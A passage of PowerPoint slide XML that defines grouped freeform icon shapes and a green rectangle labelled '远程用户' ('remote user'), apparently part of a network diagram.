                  <a:gd name="T5" fmla="*/ 5384 h 169"/>
                  <a:gd name="T6" fmla="*/ 93122 w 191"/>
                  <a:gd name="T7" fmla="*/ 0 h 169"/>
                  <a:gd name="T8" fmla="*/ 101903 w 191"/>
                  <a:gd name="T9" fmla="*/ 16636 h 169"/>
                  <a:gd name="T10" fmla="*/ 101903 w 191"/>
                  <a:gd name="T11" fmla="*/ 16636 h 169"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 191"/>
                  <a:gd name="T19" fmla="*/ 0 h 169"/>
                  <a:gd name="T20" fmla="*/ 191 w 191"/>
                  <a:gd name="T21" fmla="*/ 169 h 169"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T12">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T15">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T16">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                  <a:cxn ang="T17">
                    <a:pos x="T10" y="T11"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T18" t="T19" r="T20" b="T21"/>
                <a:pathLst>
                  <a:path w="191" h="169">
                    <a:moveTo>
                      <a:pt x="191" y="118"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="174" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="191" y="118"/>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509" name="Freeform 25"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2371" y="1379"/>
                <a:ext cx="363" cy="156"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 6366 h 130"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 17862 h 130"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 6956 h 130"/>
                  <a:gd name="T6" fmla="*/ 95402 w 287"/>
                  <a:gd name="T7" fmla="*/ 0 h 130"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 6366 h 130"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 6366 h 130"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 287"/>
                  <a:gd name="T19" fmla="*/ 0 h 130"/>
                  <a:gd name="T20" fmla="*/ 287 w 287"/>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287" h="130">
                    <a:moveTo>
                      <a:pt x="287" y="47"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="51"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="47"/>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8312" name="Group 26"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="2688" y="2728"/>
              <a:ext cx="635" cy="318"/>
              <a:chOff x="2317" y="1111"/>
              <a:chExt cx="755" cy="445"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98490" name="Rectangle 27"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2317" y="1111"/>
                <a:ext cx="755" cy="445"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="00CC99"/>
              </a:solidFill>
              <a:ln w="38100">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" tIns="9144" rIns="27432"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="r" eaLnBrk="0" hangingPunct="0"/>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>远程用户</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98491" name="Freeform 28"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2372" y="1437"/>
                <a:ext cx="363" cy="114"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 1597 h 95"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 13046 h 95"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 2239 h 95"/>
                  <a:gd name="T6" fmla="*/ 0 w 287"/>
                  <a:gd name="T7" fmla="*/ 446 h 95"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 0 h 95"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 1597 h 95"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 287"/>
                  <a:gd name="T19" fmla="*/ 0 h 95"/>
                  <a:gd name="T20" fmla="*/ 287 w 287"/>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287" h="95">
                    <a:moveTo>
                      <a:pt x="287" y="12"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="12"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98492" name="Freeform 29"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2332" y="1233"/>
                <a:ext cx="230" cy="207"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101396 w 182"/>
                  <a:gd name="T1" fmla="*/ 468 h 172"/>
                  <a:gd name="T2" fmla="*/ 17619 w 182"/>
                  <a:gd name="T3" fmla="*/ 25518 h 172"/>
                  <a:gd name="T4" fmla="*/ 12976 w 182"/>
                  <a:gd name="T5" fmla="*/ 24724 h 172"/>
                  <a:gd name="T6" fmla="*/ 0 w 182"/>
                  <a:gd name="T7" fmla="*/ 5582 h 172"/>
                  <a:gd name="T8" fmla="*/ 94937 w 182"/>
                  <a:gd name="T9" fmla="*/ 0 h 172"/>
                  <a:gd name="T10" fmla="*/ 101396 w 182"/>
                  <a:gd name="T11" fmla="*/ 468 h 172"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 182"/>
                  <a:gd name="T19" fmla="*/ 0 h 172"/>
                  <a:gd name="T20" fmla="*/ 182 w 182"/>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182" h="172">
                    <a:moveTo>
                      <a:pt x="182" y="3"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="32" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="171" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="3"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98493" name="Freeform 30"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2371" y="1435"/>
                <a:ext cx="363" cy="116"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 2167 h 96"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 15792 h 96"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 2618 h 96"/>
                  <a:gd name="T6" fmla="*/ 0 w 287"/>
                  <a:gd name="T7" fmla="*/ 684 h 96"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 0 h 96"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 2167 h 96"/>
                  <a:gd name="T12" fmla="*/ 163251 w 287"/>
                  <a:gd name="T13" fmla="*/ 2167 h 96"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 287"/>
                  <a:gd name="T22" fmla="*/ 0 h 96"/>
                  <a:gd name="T23" fmla="*/ 287 w 287"/>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7" h="96">
                    <a:moveTo>
                      <a:pt x="287" y="13"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="96"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="13"/>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94" name="Freeform 31"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2332" y="1232"/>
                <a:ext cx="230" cy="208"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101396 w 182"/>
                  <a:gd name="T1" fmla="*/ 549 h 173"/>
                  <a:gd name="T2" fmla="*/ 17111 w 182"/>
                  <a:gd name="T3" fmla="*/ 25059 h 173"/>
                  <a:gd name="T4" fmla="*/ 12334 w 182"/>
                  <a:gd name="T5" fmla="*/ 23995 h 173"/>
                  <a:gd name="T6" fmla="*/ 0 w 182"/>
                  <a:gd name="T7" fmla="*/ 5465 h 173"/>
                  <a:gd name="T8" fmla="*/ 94840 w 182"/>
                  <a:gd name="T9" fmla="*/ 0 h 173"/>
                  <a:gd name="T10" fmla="*/ 101396 w 182"/>
                  <a:gd name="T11" fmla="*/ 549 h 173"/>
                  <a:gd name="T12" fmla="*/ 101396 w 182"/>
                  <a:gd name="T13" fmla="*/ 549 h 173"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 182"/>
                  <a:gd name="T22" fmla="*/ 0 h 173"/>
                  <a:gd name="T23" fmla="*/ 182 w 182"/>
                  <a:gd name="T24" fmla="*/ 173 h 1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73">
                    <a:moveTo>
                      <a:pt x="182" y="4"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="31" y="173"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="170" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="4"/>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95" name="Freeform 32"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2343" y="1237"/>
                <a:ext cx="242" cy="203"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 114015 w 191"/>
                  <a:gd name="T1" fmla="*/ 16844 h 169"/>
                  <a:gd name="T2" fmla="*/ 13859 w 191"/>
                  <a:gd name="T3" fmla="*/ 23863 h 169"/>
                  <a:gd name="T4" fmla="*/ 0 w 191"/>
                  <a:gd name="T5" fmla="*/ 5384 h 169"/>
                  <a:gd name="T6" fmla="*/ 103024 w 191"/>
                  <a:gd name="T7" fmla="*/ 0 h 169"/>
                  <a:gd name="T8" fmla="*/ 114015 w 191"/>
                  <a:gd name="T9" fmla="*/ 16844 h 169"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 191"/>
                  <a:gd name="T16" fmla="*/ 0 h 169"/>
                  <a:gd name="T17" fmla="*/ 191 w 191"/>
                  <a:gd name="T18" fmla="*/ 169 h 169"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="191" h="169">
                    <a:moveTo>
                      <a:pt x="191" y="119"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="173" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="191" y="119"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98496" name="Freeform 33"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2360" y="1251"/>
                <a:ext cx="208" cy="175"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 85546 w 165"/>
                  <a:gd name="T1" fmla="*/ 16357 h 145"/>
                  <a:gd name="T2" fmla="*/ 10273 w 165"/>
                  <a:gd name="T3" fmla="*/ 23288 h 145"/>
                  <a:gd name="T4" fmla="*/ 0 w 165"/>
                  <a:gd name="T5" fmla="*/ 5404 h 145"/>
                  <a:gd name="T6" fmla="*/ 77887 w 165"/>
                  <a:gd name="T7" fmla="*/ 0 h 145"/>
                  <a:gd name="T8" fmla="*/ 85546 w 165"/>
                  <a:gd name="T9" fmla="*/ 16357 h 145"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 165"/>
                  <a:gd name="T16" fmla="*/ 0 h 145"/>
                  <a:gd name="T17" fmla="*/ 165 w 165"/>
                  <a:gd name="T18" fmla="*/ 145 h 145"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="165" h="145">
                    <a:moveTo>
                      <a:pt x="165" y="102"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="20" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="102"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98497" name="Freeform 34"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2372" y="1380"/>
                <a:ext cx="363" cy="155"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 6639 h 129"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 18316 h 129"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 7118 h 129"/>
                  <a:gd name="T6" fmla="*/ 95402 w 287"/>
                  <a:gd name="T7" fmla="*/ 0 h 129"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 6639 h 129"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 287"/>
                  <a:gd name="T16" fmla="*/ 0 h 129"/>
                  <a:gd name="T17" fmla="*/ 287 w 287"/>
                  <a:gd name="T18" fmla="*/ 129 h 129"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="287" h="129">
                    <a:moveTo>
                      <a:pt x="287" y="47"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="47"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98498" name="Freeform 35"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2342" y="1237"/>
                <a:ext cx="241" cy="203"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101903 w 191"/>
                  <a:gd name="T1" fmla="*/ 16636 h 169"/>
                  <a:gd name="T2" fmla="*/ 12299 w 191"/>
                  <a:gd name="T3" fmla="*/ 23863 h 169"/>
                  <a:gd name="T4" fmla="*/ 0 w 191"/>
                  <a:gd name="T5" fmla="*/ 5384 h 169"/>
                  <a:gd name="T6" fmla="*/ 93122 w 191"/>
                  <a:gd name="T7" fmla="*/ 0 h 169"/>
                  <a:gd name="T8" fmla="*/ 101903 w 191"/>
                  <a:gd name="T9" fmla="*/ 16636 h 169"/>
                  <a:gd name="T10" fmla="*/ 101903 w 191"/>
                  <a:gd name="T11" fmla="*/ 16636 h 169"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 191"/>
                  <a:gd name="T19" fmla="*/ 0 h 169"/>
                  <a:gd name="T20" fmla="*/ 191 w 191"/>
                  <a:gd name="T21" fmla="*/ 169 h 169"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T12">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T15">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T16">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                  <a:cxn ang="T17">
                    <a:pos x="T10" y="T11"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T18" t="T19" r="T20" b="T21"/>
                <a:pathLst>
                  <a:path w="191" h="169">
                    <a:moveTo>
                      <a:pt x="191" y="118"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="174" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="191" y="118"/>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99" name="Freeform 36"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2371" y="1379"/>
                <a:ext cx="363" cy="156"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 6366 h 130"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 17862 h 130"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 6956 h 130"/>
                  <a:gd name="T6" fmla="*/ 95402 w 287"/>
                  <a:gd name="T7" fmla="*/ 0 h 130"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 6366 h 130"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 6366 h 130"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 287"/>
                  <a:gd name="T19" fmla="*/ 0 h 130"/>
                  <a:gd name="T20" fmla="*/ 287 w 287"/>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287" h="130">
                    <a:moveTo>
                      <a:pt x="287" y="47"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="51"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="0"/>
